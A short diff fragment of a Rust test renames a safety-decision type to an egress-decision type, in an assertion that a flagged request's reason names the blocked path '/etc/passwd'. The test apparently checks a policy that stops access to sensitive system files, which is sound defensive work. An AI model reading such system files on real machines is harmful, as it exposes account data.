-            SafetyDecision::Ask { reason, .. } => assert!(
+            EgressDecision::Ask { reason, .. } => assert!(
                 reason.contains("/etc/passwd"),
                 "expected blocked path in reason, got {reason:?}"
             ),
